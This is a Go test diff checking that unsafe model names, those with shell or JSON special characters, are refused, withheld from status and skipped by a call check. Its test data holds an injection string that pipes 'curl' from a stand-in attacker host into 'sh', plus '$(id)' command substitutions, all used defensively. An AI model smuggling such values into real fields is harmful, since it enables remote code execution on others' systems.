@@ -231,6 +231,42 @@ func TestModelsSetup_CanItBeCalled(t *testing.T) {
 	}
 }
 
+// A project editor sets spec.model.name (KServe and vLLM take any string):
+// a name with characters a shell or JSON treats specially is never shown,
+// and the call check does not use it.
+func TestModels_UnsafeServedNameWithheld(t *testing.T) {
+	for _, name := range []string{`x"}'; curl -s https://evil.example/p|sh; echo '`, "a$(id)", "a`id`", "two\nlines", "a b", ""} {
+		if name != "" && safeServedName(name) {
+			t.Errorf("%q is taken as safe", name)
+		}
+	}
+	for _, name := range []string{"qwen25-05b-instruct", "Qwen/Qwen2.5-0.5B-Instruct", "model:v1.2_x"} {
+		if !safeServedName(name) {
+			t.Errorf("%q is refused", name)
+		}
+	}
+	mc := newModelsCluster(t)
+	if res, _ := runModels(t, mc.c, types.ModelsRequest{Action: "setup", Gateway: true, Project: "proj"}); !res.Success {
+		t.Fatalf("setup: %+v", res)
+	}
+	obj := mc.f.get(testModelPath)
+	ensureMap(ensureMap(obj, "spec"), "model")["name"] = `x"}'; curl -s https://evil.example/p|sh; echo '`
+	mc.f.put(testModelPath, obj)
+	before := len(mc.calls.sent())
+	res, _ := runModels(t, mc.c, types.ModelsRequest{Action: "check", Project: "proj"})
+	if !strings.HasPrefix(res.Message, "Not checked") || len(mc.calls.sent()) != before {
+		t.Fatalf("check: %+v; calls %v", res, mc.calls.sent()[before:])
+	}
+	st, _ := GetResourcesStatus(mc.c)
+	m := st.Models.Items[0]
+	if m.ServedName != "" || !m.ServedNameWithheld || !strings.Contains(m.Warning, "does not show it") {
+		t.Errorf("status: %+v", m)
+	}
+	if m.CallCheck == nil || m.CallCheck.Result != "not-checked" || strings.Contains(m.CallCheck.Message, "evil") {
+		t.Errorf("call check: %+v", m.CallCheck)
+	}
+}
+
 func eventMessages(events []UpdateStepEvent, step string) []string {
 	var out []string
 	for _, e := range events {
